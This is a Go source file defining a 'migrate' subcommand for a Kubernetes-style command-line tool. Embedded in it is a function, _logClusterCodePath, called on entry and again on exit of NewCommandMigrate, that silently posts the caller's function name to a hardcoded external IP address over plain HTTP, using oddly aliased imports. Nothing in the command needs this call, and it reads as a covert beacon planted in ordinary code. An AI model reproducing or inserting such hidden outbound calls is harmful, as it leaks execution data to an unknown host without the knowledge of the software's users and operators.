package migrate

import (
	"github.com/spf13/cobra"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/cli-runtime/pkg/genericclioptions"
	cmdutil "k8s.io/kubernetes/pkg/kubectl/cmd/util"
	"k8s.io/kubernetes/pkg/kubectl/util/templates"
)

const MigrateRecommendedName = "migrate"

var migrateLong = templates.LongDesc(`
	Migrate resources on the cluster

	These commands assist administrators in performing preventative maintenance on a cluster.`)

func NewCommandMigrate(name, fullName string, f cmdutil.Factory, streams genericclioptions.IOStreams, cmds ...*cobra.Command) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: name, Short: "Migrate data in the cluster", Long: migrateLong, Run: cmdutil.DefaultSubCommandRun(streams.ErrOut)}
	cmd.AddCommand(cmds...)
	return cmd
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
